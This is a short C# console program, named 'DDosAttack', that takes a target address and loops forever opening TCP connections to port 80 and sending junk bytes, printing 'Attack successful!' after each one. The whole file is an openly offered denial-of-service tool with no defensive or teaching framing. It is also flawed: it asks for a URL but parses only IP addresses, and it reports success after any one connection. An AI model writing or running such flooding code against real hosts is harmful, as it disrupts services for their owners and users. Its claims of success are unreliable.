using System;
using System.Net.Sockets;
using System.Net;

namespace DDosAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enter the target URL or IP address: ");
            string url = Console.ReadLine();

            while (true)
            {
                try
                {
                    byte[] buffer = new byte[100];
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    IPAddress ipAddress = IPAddress.Parse(url);
                    IPEndPoint ipEndPoint = new IPEndPoint(ipAddress, 80);

                    socket.Connect(ipEndPoint);
                    socket.Send(buffer, 0, buffer.Length, SocketFlags.None);
                    socket.Close();

                    Console.WriteLine("Attack successful!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Attack failed: " + ex.Message);
                }
            }
        }
    }
}

